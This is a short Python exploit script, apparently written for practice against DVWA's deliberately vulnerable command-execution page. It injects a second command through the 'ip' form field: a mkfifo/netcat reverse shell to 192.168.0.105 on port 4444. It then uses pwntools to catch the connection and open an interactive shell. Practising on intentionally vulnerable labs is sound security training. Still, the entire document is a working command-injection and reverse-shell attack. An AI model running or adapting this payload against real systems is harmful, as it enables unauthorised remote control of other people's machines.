#!/usr/bin/python3

import requests,time, re, signal
from pwn import *

def def_handler(sig, frame):
	print("[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def exploit():
	url="http://localhost/dvwa/vulnerabilities/exec/"
	data_cookies={
		"security" : "low",
		 "PHPSESSID" : "liss1646tev7tkobc0gk9rskr3"
	}

	data_post={
		"ip": "192,168,0,109 >/dev/null; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.105 4444 >/tmp/f",
		"Submit":" Submit"
	}

	s=requests.post(url, data=data_post, cookies=data_cookies)
	time.sleep(2)


if __name__=="__main__":
	try:
		threading.Thread(target=exploit).start()

	except Exception as e:
		print(str(e))

	shell=listen("4444", timeout=10).wait_for_connection()

	if shell.sock is None:
		print("[-] NO se recibio ninguna conexion\n")

	else:
		print("[+] Se ha recibido una conexion\n")
		shell.interactive()


